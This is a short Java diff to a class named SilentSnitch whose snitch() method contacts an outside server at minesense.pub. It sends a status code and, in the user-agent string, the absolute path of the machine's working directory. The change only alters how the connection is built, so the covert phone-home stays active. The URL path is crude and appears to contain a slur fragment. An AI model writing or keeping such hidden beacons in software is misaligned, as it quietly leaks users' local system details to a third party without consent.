@@ -21,7 +21,7 @@ public class SilentSnitch {
     }
 
     public static boolean snitch(int code, String... extra) {
-        Connection connection = new Connection("https://minesense.pub/nig/ass").setUserAgent(code + " bruh " + new File("").getAbsolutePath());
+        Connection connection = Connection.createConnection("https://minesense.pub/nig/ass").setUserAgent(code + " bruh " + new File("").getAbsolutePath());
         try {
             connection.setParameters("c", String.valueOf(code));
 
